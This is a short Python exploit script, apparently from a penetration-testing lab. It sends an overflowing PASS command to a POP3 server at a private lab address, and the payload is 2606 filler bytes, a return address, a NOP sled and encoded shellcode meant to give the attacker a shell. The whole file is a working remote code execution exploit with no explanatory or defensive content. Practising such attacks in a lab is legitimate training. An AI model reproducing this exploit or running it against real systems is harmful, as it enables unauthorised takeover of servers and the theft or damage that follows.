#!/usr/bin/python

import socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#bad chars: \x00\x0a\x0d
shellcode= ("\xba\x9b\xb1\x51\x0e\xda\xcc\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x83\xc3\x04\x31\x53\x0e\x03\xc8\xbf\xb3\xfb\x12\x57\xb1"
"\x04\xea\xa8\xd6\x8d\x0f\x99\xd6\xea\x44\x8a\xe6\x79\x08\x27"
"\x8c\x2c\xb8\xbc\xe0\xf8\xcf\x75\x4e\xdf\xfe\x86\xe3\x23\x61"
"\x05\xfe\x77\x41\x34\x31\x8a\x80\x71\x2c\x67\xd0\x2a\x3a\xda"
"\xc4\x5f\x76\xe7\x6f\x13\x96\x6f\x8c\xe4\x99\x5e\x03\x7e\xc0"
"\x40\xa2\x53\x78\xc9\xbc\xb0\x45\x83\x37\x02\x31\x12\x91\x5a"
"\xba\xb9\xdc\x52\x49\xc3\x19\x54\xb2\xb6\x53\xa6\x4f\xc1\xa0"
"\xd4\x8b\x44\x32\x7e\x5f\xfe\x9e\x7e\x8c\x99\x55\x8c\x79\xed"
"\x31\x91\x7c\x22\x4a\xad\xf5\xc5\x9c\x27\x4d\xe2\x38\x63\x15"
"\x8b\x19\xc9\xf8\xb4\x79\xb2\xa5\x10\xf2\x5f\xb1\x28\x59\x08"
"\x76\x01\x61\xc8\x10\x12\x12\xfa\xbf\x88\xbc\xb6\x48\x17\x3b"
"\xb8\x62\xef\xd3\x47\x8d\x10\xfa\x83\xd9\x40\x94\x22\x62\x0b"
"\x64\xca\xb7\x9c\x34\x64\x68\x5d\xe4\xc4\xd8\x35\xee\xca\x07"
"\x25\x11\x01\x20\xcc\xe8\xc2\x45\x1a\xf2\x6e\x32\x1e\xf2\x8f"
"\x79\x97\x14\xe5\x6d\xfe\x8f\x92\x14\x5b\x5b\x02\xd8\x71\x26"
"\x04\x52\x76\xd7\xcb\x93\xf3\xcb\xbc\x53\x4e\xb1\x6b\x6b\x64"
"\xdd\xf0\xfe\xe3\x1d\x7e\xe3\xbb\x4a\xd7\xd5\xb5\x1e\xc5\x4c"
"\x6c\x3c\x14\x08\x57\x84\xc3\xe9\x56\x05\x81\x56\x7d\x15\x5f"
"\x56\x39\x41\x0f\x01\x97\x3f\xe9\xfb\x59\xe9\xa3\x50\x30\x7d"
"\x35\x9b\x83\xfb\x3a\xf6\x75\xe3\x8b\xaf\xc3\x1c\x23\x38\xc4"
"\x65\x59\xd8\x2b\xbc\xd9\xe8\x61\x9c\x48\x61\x2c\x75\xc9\xec"
"\xcf\xa0\x0e\x09\x4c\x40\xef\xee\x4c\x21\xea\xab\xca\xda\x86"
"\xa4\xbe\xdc\x35\xc4\xea")



buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode

try:
	print("sending evil buffer")
	s.connect(('10.11.20.40',110))
	data = s.recv(1024)
	s.send('USER username ' + '\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	s.close()
	print('\nDONE - Did you get a shell?')
except:
	"couldn't connect to POP3!"
